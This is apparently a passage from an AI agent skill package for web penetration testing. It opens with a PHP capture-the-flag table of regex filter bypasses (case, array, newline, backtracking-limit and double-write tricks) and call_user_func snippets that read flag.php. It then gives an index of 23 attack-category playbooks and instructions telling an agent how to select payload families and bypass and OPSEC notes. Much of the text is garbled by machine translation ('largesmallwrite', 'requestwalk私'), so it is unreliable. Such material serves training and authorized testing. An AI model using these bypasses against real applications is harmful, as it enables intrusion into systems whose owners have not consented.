| largesmallwriteFilter | `/n\|c/m` | `Nss2::Ctf`（largesmallwritebypass） |
| stringfunctionFilter | `/system\|exec/` | `p[]=class&p[]=method`（array bypass） |
| 锚pointMatch | `/^flag$/` | `flag%0a` or `%0aflag`（换rowbypass） |
| backtrackinglimitation | `/.*/` | supergrowstringtrigger PCRE backtrackinglimitation |
| no/without锚point | `/flag/` | `flflagag`（doublewritebypass，like/such as do(past tense) str_replace） |

## call_user_func return调way/mannerquick reference

```php
// call/invokeregular/normalfunction
call_user_func('readfile', 'flag.php');

// call/invokestaticmethod（stringform）
call_user_func('Nss2::Ctf');  // largesmallwritebypass after/back

// call/invokestaticmethod（Arrayform）
call_user_func(['Nss2', 'Ctf']);  // array bypass after/back

// call/invokeinstancemethod
call_user_func([$obj, 'method']);
```

## ⚠️ commonerror/mistake

1. **`call_user_func('readfile')` notbring/carryparameter** — will notReadanyFile，musttransmit `call_user_func('readfile', 'flag.php')`
2. **Obfuscation `m` and `i` 修饰symbol/character** — `m` ismulti/multiplerowpattern，`i` justisignoreslargesmallwrite
3. **ignores PHP typemixed耍** — `preg_match` meet toArrayreturns `false`，notis `0`
4. **guess flag content** — mustvia/throughtoolGettruesolidresponse，cannoteditcreate/build

## References — web-playbook-index

# Web Security Category Index

- point击Hijack (2): web-playbook-01-clickjacking.md
- Supply Chain Attack (3): web-playbook-02-supply-chain-attacks.md
- cacheand/withCDNsecurity (3): web-playbook-03-cache-and-cdn-security.md
- Open Redirect (3): web-playbook-04-open-redirect.md
- Frameworkvulnerability (18): web-playbook-05-framework-vulnerabilities.md
- requestwalk私 (4): web-playbook-06-request-smuggling.md
- Authenticationvulnerability (10): web-playbook-07-authentication-vulnerabilities.md
- Filevulnerability (7): web-playbook-08-file-vulnerabilities.md
- Business Logic Vulnerability (5): web-playbook-09-business-logic-vulnerabilities.md
- original typechain污染 (3): web-playbook-10-prototype-pollution.md
- 云securityvulnerability (4): web-playbook-11-cloud-security-vulnerabilities.md
- AIsecurity (4): web-playbook-12-ai-security.md
- APIsecurity (12): web-playbook-13-api-security.md
- CSRFCross-Site Request Forgery (8): web-playbook-14-csrf-cross-site-request-forgery.md
- JWTsecurity (4): web-playbook-15-jwt-security.md
- LFI/RFIfile inclusion (12): web-playbook-16-lfi-rfi-file-inclusion.md
- RCERemote Code Execution (12): web-playbook-17-rce-remote-code-execution.md
- SQL/NoSQL Injection (17): web-playbook-18-sql-nosql-injection.md
- SSRFServer-Side Request Forgery (12): web-playbook-19-ssrf-server-side-request-forgery.md
- SSTITemplate Injection (10): web-playbook-20-ssti-template-injection.md
- WebSocketsecurity (3): web-playbook-21-websocket-security.md
- XSS跨standfootthis (12): web-playbook-22-xss-cross-site-scripting.md
- XXEsolidbodyInject (9): web-playbook-23-xxe-entity-injection.md

## References — web-security-playbook-skill

---
name: web-security-playbook
description: Authorized web security reference for selecting attack categories, payload families, bypass notes, workflow summaries, and mitigations across web, API, JWT, cloud, AI, framework, and WebSocket testing. Use for pentest planning, report drafting, or converting the extracted wiki into narrower web-focused skills.
---

# Web Security Playbook

Use this skill for authorized security testing, defense validation, training, or documentation work.

## When To Use

- The user needs a category-level web testing playbook rather than a single exploit recipe.
- The task involves choosing among multiple web attack families, payload styles, or bypass approaches.
- The user wants to turn the extracted wiki into narrower skills, checklists, notes, or reports.

## When Not To Use

- A narrower existing skill already covers the request better.
- The task is primarily internal network, AD, Windows, Exchange, or SharePoint work.
- The user only needs a tool cheat sheet rather than attack-family guidance.

## Workflow

1. Start with `references/web-playbook-index.md`, then narrow to 1-3 relevant category files.
2. If the request still spans multiple attack families, keep the answer grouped by category instead of by individual payload.
3. If a specific payload entry is needed, use the packaged reference entries in `references/`; any extracted source path still shown in entries should be treated as provenance only.
4. Return only the payload families, variants, prerequisites, bypass notes, OPSEC notes, and mitigations that match the authorized scope.
5. When writing a new skill, checklist, or report, rewrite the selected material into the target format instead of copying whole reference files.

## Category Map

- point击Hijack: `references/web-playbook-01-clickjacking.md`
- Supply Chain Attack: `references/web-playbook-02-supply-chain-attacks.md`
- cacheand/withCDNsecurity: `references/web-playbook-03-cache-and-cdn-security.md`
- Open Redirect: `references/web-playbook-04-open-redirect.md`
- Frameworkvulnerability: `references/web-playbook-05-framework-vulnerabilities.md`
- requestwalk私: `references/web-playbook-06-request-smuggling.md`
- Authenticationvulnerability: `references/web-playbook-07-authentication-vulnerabilities.md`
- Filevulnerability: `references/web-playbook-08-file-vulnerabilities.md`
- Business Logic Vulnerability: `references/web-playbook-09-business-logic-vulnerabilities.md`
- original typechain污染: `references/web-playbook-10-prototype-pollution.md`
- 云securityvulnerability: `references/web-playbook-11-cloud-security-vulnerabilities.md`
- AIsecurity: `references/web-playbook-12-ai-security.md`
- APIsecurity: `references/web-playbook-13-api-security.md`
- CSRFCross-Site Request Forgery: `references/web-playbook-14-csrf-cross-site-request-forgery.md`
- JWTsecurity: `references/web-playbook-15-jwt-security.md`
- LFI/RFIfile inclusion: `references/web-playbook-16-lfi-rfi-file-inclusion.md`
- RCERemote Code Execution: `references/web-playbook-17-rce-remote-code-execution.md`
- SQL/NoSQL Injection: `references/web-playbook-18-sql-nosql-injection.md`
- SSRFServer-Side Request Forgery: `references/web-playbook-19-ssrf-server-side-request-forgery.md`
- SSTITemplate Injection: `references/web-playbook-20-ssti-template-injection.md`
- WebSocketsecurity: `references/web-playbook-21-websocket-security.md`
- XSS跨standfootthis: `references/web-playbook-22-xss-cross-site-scripting.md`
- XXEsolidbodyInject: `references/web-playbook-23-xxe-entity-injection.md`

## Notes

- Prefer 1-3 categories per request, not the whole corpus.
- Use `references/web-playbook-index.md` as the first stop for category selection.
- Use source markdown files for detailed commands and tutorial text.
- Keep outputs scoped to the user's target stack and authorization.
